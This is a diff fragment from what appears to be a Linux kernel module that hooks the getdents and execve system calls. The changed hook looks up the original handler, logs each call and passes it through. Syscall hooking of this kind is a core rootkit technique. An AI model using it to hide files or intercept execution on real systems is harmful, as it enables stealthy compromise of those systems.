@@ -331,16 +331,16 @@ asmlinkage int new_execve(const char *filename, char *const argv[], char *const 
   return (*orig_func)(filename, argv, envp);
 }
 
-asmlinkage int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
   int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-  // t_syscall_hook *getdents_hook;
+  t_syscall_hook *getdents_hook;
 
-  // //Find the t_syscall_hook for __NR_getdents from our linked list
-  // getdents_hook = find_syscall_hook(__NR_getdents);
-  // //And cast the orig_func void pointer into the orig_func to be invoked
-  // orig_func = (void*) getdents_hook->orig_func;
+  //Find the t_syscall_hook for __NR_getdents from our linked list
+  getdents_hook = find_syscall_hook(__NR_getdents);
+  //And cast the orig_func void pointer into the orig_func to be invoked
+  orig_func = (void*) getdents_hook->orig_func;
 
-  // printk(KERN_INFO "getdents was called\n");
+  printk(KERN_INFO "getdents was called\n");
 
   //Invoke the original syscall
   return (*orig_func)(fd, dirp, count);
